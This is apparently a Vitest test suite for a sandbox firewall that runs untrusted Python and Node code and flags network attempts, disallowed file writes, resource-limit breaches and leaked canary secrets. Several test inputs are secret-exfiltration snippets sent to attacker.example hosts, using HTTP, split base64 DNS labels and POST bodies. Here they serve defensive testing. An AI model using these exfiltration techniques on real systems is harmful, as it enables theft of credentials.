import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { newId, type RunRequest } from "@firewall/contract";
import { preset } from "@firewall/policy";
import { findCanaries } from "./canary.js";
import { diff, type FsSnapshot } from "./fsdiff.js";
import { WasmerRunner } from "./runner.js";

describe("canary", () => {
  const canaries = { KEY: "AKIAFAKE0000CANARY42/firewall" };
  it("finds raw and encoded values", () => {
    expect(findCanaries("x AKIAFAKE0000CANARY42/firewall y", canaries)).toEqual([{ name: "KEY", encoding: "raw" }]);
    expect(findCanaries(Buffer.from(canaries.KEY).toString("base64"), canaries)[0]?.encoding).toBe("base64");
    expect(findCanaries(encodeURIComponent(canaries.KEY), canaries)[0]?.encoding).toBe("urlencoded");
    expect(findCanaries("nothing here", canaries)).toEqual([]);
  });
  it("finds dns-sized chunks", () => {
    const b64 = Buffer.from(canaries.KEY).toString("base64url");
    const host = `${b64.slice(0, 20)}.dns.attacker.example`;
    expect(findCanaries(host, canaries, { minChunk: 12 }).length).toBe(1);
    expect(findCanaries(host, canaries).length).toBe(0);
  });
  it("finds a base32-encoded value (case-insensitive DNS exfil)", () => {
    // RFC 4648 base32 of the canary, no padding.
    const bytes = Buffer.from(canaries.KEY);
    const A = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
    let bits = 0, value = 0, b32 = "";
    for (const b of bytes) { value = (value << 8) | b; bits += 8; while (bits >= 5) { b32 += A[(value >>> (bits - 5)) & 31]; bits -= 5; } }
    if (bits > 0) b32 += A[(value << (5 - bits)) & 31];
    expect(findCanaries(`somehost-${b32}-more`, canaries)[0]?.encoding).toBe("base32");
  });
});

describe("fsdiff", () => {
  it("classifies create, modify and delete", () => {
    const before: FsSnapshot = new Map([
      ["/workspace/a.txt", { kind: "file", size: 1, hash: "x" }],
      ["/workspace/gone.txt", { kind: "file", size: 1, hash: "y" }],
    ]);
    const after: FsSnapshot = new Map([
      ["/workspace/a.txt", { kind: "file", size: 1, hash: "z" }],
      ["/workspace/out", { kind: "directory", size: 0 }],
      ["/workspace/out/new.txt", { kind: "file", size: 3, hash: "n" }],
    ]);
    const changes = diff(before, after, (p) => p.startsWith("/workspace/out/"));
    expect(changes).toEqual([
      { path: "/workspace/a.txt", op: "modify", bytes: 1, allowed: false },
      { path: "/workspace/out/new.txt", op: "create", bytes: 3, allowed: true },
      { path: "/workspace/gone.txt", op: "delete", allowed: false },
    ]);
  });
});

const online = process.env.FIREWALL_TEST_ONLINE === "1";

describe("WasmerRunner (real sandboxes)", () => {
  const runner = new WasmerRunner({ maxConcurrent: 2 });
  beforeAll(async () => {
    await runner.warm(["python"]);
  }, 180_000);
  afterAll(async () => {
    await runner.close();
  });

  const req = (code: string, over: Partial<RunRequest> = {}): RunRequest => ({
    id: newId("test"),
    language: "python",
    code,
    policy: preset("strict"),
    ...over,
  });

  it("runs clean code and reports timings", async () => {
    const t = await runner.run(req("print(sum(range(10)))"));
    expect(t.stdout.trim()).toBe("45");
    expect(t.exitCode).toBe(0);
    expect(t.verdict).toBe("clean");
    expect(t.violations).toEqual([]);
    expect(t.timings.sandboxCreateMs).toBeLessThan(2000);
  });

  it("blocks and records a network attempt under strict policy", async () => {
    const t = await runner.run(
      req("import urllib.request\ntry:\n  urllib.request.urlopen('http://exfil.attacker.example/x', timeout=5)\nexcept Exception as e:\n  print('failed', e)"),
    );
    expect(t.network.some((e) => e.host === "exfil.attacker.example" && !e.allowed)).toBe(true);
    expect(t.violations.map((v) => v.kind)).toContain("network.blocked");
    expect(t.verdict).toBe("blocked");
  });

  it("refuses raw IP connections not derived from an allowed resolve", async () => {
    const t = await runner.run(req("import socket\ns=socket.socket()\ns.settimeout(5)\ntry:\n  s.connect(('93.184.216.34',80)); print('connected')\nexcept Exception as e:\n  print('failed', e)"));
    expect(t.stdout).toContain("failed");
    expect(t.network.some((e) => e.kind === "connect" && e.host === "93.184.216.34" && !e.allowed)).toBe(true);
    expect(t.verdict).toBe("blocked");
  });

  it("flags writes outside writable paths and allows out/", async () => {
    const t = await runner.run(req("import os\nos.makedirs('out', exist_ok=True)\nopen('out/ok.txt','w').write('fine')\nopen('notes.txt','w').write('hi')\nprint('wrote')"));
    expect(t.fs).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ path: "/workspace/out/ok.txt", allowed: true }),
        expect.objectContaining({ path: "/workspace/notes.txt", allowed: false }),
      ]),
    );
    expect(t.violations.map((v) => v.kind)).toEqual(["fs.outside_writable"]);
    expect(t.verdict).toBe("suspicious");
  });

  it("detects a canary leaked through stdout", async () => {
    const t = await runner.run(req("import os\nprint('key is', os.environ['AWS_SECRET_ACCESS_KEY'])"));
    expect(t.violations.map((v) => v.kind)).toContain("canary.leaked");
    expect(t.verdict).toBe("blocked");
  });

  it("kills a cpu hog at the wall-clock limit", async () => {
    const p = preset("strict");
    p.limits.wallMs = 2000;
    const t = await runner.run(req("while True: pass", { policy: p }));
    expect(t.exitReason).toBe("timeout");
    expect(t.violations.map((v) => v.kind)).toContain("limit.wall");
  });

  it("truncates flooding output", async () => {
    const p = preset("strict");
    p.limits.maxOutputBytes = 4096;
    const t = await runner.run(req("print('x' * 100000)", { policy: p }));
    expect(t.outputTruncated).toBe(true);
    expect(t.violations.map((v) => v.kind)).toContain("limit.output");
  });

  it("runs interpreter args directly when code is empty", async () => {
    const t = await runner.run(req("", { args: ["-c", "print('direct')"] }));
    expect(t.stdout.trim()).toBe("direct");
  });

  it.skipIf(!online)("allows an allowlisted host end to end", async () => {
    const t = await runner.run(req("import urllib.request\nprint(urllib.request.urlopen('http://example.com', timeout=10).status)", { policy: preset("research") }));
    expect(t.stdout.trim()).toBe("200");
    expect(t.network.filter((e) => !e.allowed)).toEqual([]);
    expect(t.verdict).toBe("clean");
  });
});

describe("WasmerRunner Node guest host-fetch path", () => {
  const runner = new WasmerRunner({ maxConcurrent: 2 });
  afterAll(async () => {
    await runner.close();
  });
  const nodeReq = (code: string, policy = preset("strict")): RunRequest => ({ id: newId("test"), language: "node", code, policy });
  const FETCH = `fetch("http://example.com/").then(r => console.log("fetch status", r.status), e => console.log("fetch failed:", e.message)); setTimeout(() => {}, 1500);`;

  it("refuses Node fetch under strict and records the attempt", async () => {
    const t = await runner.run(nodeReq(FETCH));
    // undici reports the refused dispatch as a plain TypeError("fetch failed")
    // with our error as its cause; the guest only sees the outer message.
    expect(t.stdout).toContain("fetch failed");
    expect(t.network).toEqual([expect.objectContaining({ kind: "connect", host: "example.com", port: 80, allowed: false })]);
    expect(t.verdict).toBe("blocked");
  }, 120_000);

  it.skipIf(!online)("allows Node fetch to an allowlisted host", async () => {
    const t = await runner.run(nodeReq(FETCH, preset("research")));
    expect(t.stdout).toContain("fetch status 200");
    expect(t.network).toEqual([expect.objectContaining({ host: "example.com", allowed: true })]);
    expect(t.verdict).toBe("clean");
  }, 120_000);

  it.skipIf(!online)("catches a canary in a Node fetch POST body to an allowed host", async () => {
    const code = `const s=process.env.AWS_SECRET_ACCESS_KEY; fetch("http://example.com/collect",{method:"POST",body:"key="+s}).then(()=>console.log("posted"),e=>console.log("err",e.message)); setTimeout(()=>{},1500);`;
    const t = await runner.run(nodeReq(code, preset("research")));
    expect(t.violations.map((v) => v.kind)).toContain("canary.leaked");
    expect(t.verdict).toBe("blocked");
  }, 120_000);
});

describe("WasmerRunner payload and label exfil (real sandboxes)", () => {
  const runner = new WasmerRunner({ maxConcurrent: 2 });
  afterAll(async () => {
    await runner.close();
  });
  const req = (code: string, policy: RunRequest["policy"]): RunRequest => ({ id: newId("test"), language: "python", code, policy });

  it("reassembles split DNS labels to catch sub-threshold exfil", async () => {
    // permissive allows the resolves; each label is only 10 chars.
    const code = "import os, base64, socket\ns = os.environ['AWS_SECRET_ACCESS_KEY'].encode()\nenc = base64.urlsafe_b64encode(s).decode().rstrip('=')\nfor i in range(0, len(enc), 10):\n  try:\n    socket.gethostbyname(enc[i:i+10] + '.x.attacker.example')\n  except Exception:\n    pass\nprint('done')";
    const t = await runner.run(req(code, preset("permissive")));
    expect(t.violations.map((v) => v.kind)).toContain("canary.leaked");
    expect(t.verdict).toBe("blocked");
  }, 120_000);

  it("scans a file padded past 1 MB for a canary", async () => {
    const code = "import os\ns = os.environ['AWS_SECRET_ACCESS_KEY']\nos.makedirs('out', exist_ok=True)\nwith open('out/leak.bin','w') as f:\n  f.write(s + '\\n')\n  f.write('A' * (1024*1024 + 64))\nprint('wrote')";
    const t = await runner.run(req(code, preset("strict")));
    expect(t.violations.map((v) => v.kind)).toContain("canary.leaked");
    expect(t.violations.map((v) => v.kind)).not.toContain("fs.outside_writable");
    expect(t.verdict).toBe("blocked");
  }, 120_000);

  it.skipIf(!online)("catches a canary in a urllib query string to an allowed host", async () => {
    const code = "import os, urllib.request, urllib.parse\ns = os.environ['AWS_SECRET_ACCESS_KEY']\nurl = 'http://example.com/?' + urllib.parse.urlencode({'k': s})\ntry:\n  urllib.request.urlopen(url, timeout=10).read()\nexcept Exception as e:\n  print('req', e)\nprint('done')";
    const t = await runner.run(req(code, preset("research")));
    expect(t.violations.map((v) => v.kind)).toContain("canary.leaked");
    expect(t.verdict).toBe("blocked");
  }, 120_000);
});
